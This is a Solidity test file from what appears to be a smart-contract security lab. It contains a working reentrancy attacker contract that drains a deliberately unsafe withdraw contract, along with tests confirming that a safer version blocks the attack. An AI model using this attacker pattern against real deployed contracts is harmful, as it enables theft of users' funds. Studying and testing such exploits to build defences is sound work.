// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "../src/UnsafeExamples.sol";

interface Vm {
    function deal(address account, uint256 newBalance) external;
}

contract ReentrantReceiver {
    address payable public immutable target;
    bool public reentryBlocked;
    uint256 public receiveCount;

    constructor(address payable target_) {
        target = target_;
    }

    function attack() external payable {
        (bool deposited,) = target.call{value: msg.value}(
            abi.encodeWithSignature("deposit()")
        );
        require(deposited, "deposit failed");

        (bool withdrawn,) = target.call(
            abi.encodeWithSignature("withdraw()")
        );
        require(withdrawn, "initial withdrawal failed");
    }

    receive() external payable {
        receiveCount += 1;

        // Continue only while the target can cover another one-ether payout.
        if (address(target).balance >= 1 ether) {
            (bool success,) = target.call(
                abi.encodeWithSignature("withdraw()")
            );
            if (!success) {
                reentryBlocked = true;
            }
        }
    }
}

contract SoliditySecurityLabTest {
    Vm private constant vm =
        Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    receive() external payable {}

    function setUp() public {
        vm.deal(address(this), 100 ether);
    }

    function testUnsafeWithdrawCanBeDrainedByReentrancy() public {
        UnsafeWithdraw target = new UnsafeWithdraw();
        target.deposit{value: 5 ether}();

        ReentrantReceiver attacker =
            new ReentrantReceiver(payable(address(target)));
        attacker.attack{value: 1 ether}();

        require(address(target).balance == 0, "target should be drained");
        require(address(attacker).balance == 6 ether, "attacker payout mismatch");
        require(target.credit(address(attacker)) == 0, "credit should clear after attack");
        require(attacker.receiveCount() == 6, "unexpected callback count");
    }

    function testSaferWithdrawBlocksReentrancy() public {
        SaferWithdraw target = new SaferWithdraw();
        target.deposit{value: 5 ether}();

        ReentrantReceiver attacker =
            new ReentrantReceiver(payable(address(target)));
        attacker.attack{value: 1 ether}();

        require(address(target).balance == 5 ether, "target funds should remain");
        require(address(attacker).balance == 1 ether, "attacker should receive one payout");
        require(target.credit(address(attacker)) == 0, "credit should be zero");
        require(attacker.reentryBlocked(), "reentry attempt was not blocked");
    }

    function testSaferWithdrawReturnsDepositedEther() public {
        SaferWithdraw target = new SaferWithdraw();
        target.deposit{value: 2 ether}();

        require(target.credit(address(this)) == 2 ether, "deposit not credited");
        target.withdraw();

        require(address(target).balance == 0, "target should have no remaining funds");
        require(target.credit(address(this)) == 0, "credit should be zero");
    }

    function testSaferWithdrawRejectsEmptyCredit() public {
        SaferWithdraw target = new SaferWithdraw();

        (bool success,) = address(target).call(
            abi.encodeWithSignature("withdraw()")
        );

        require(!success, "withdraw without credit should revert");
    }
}
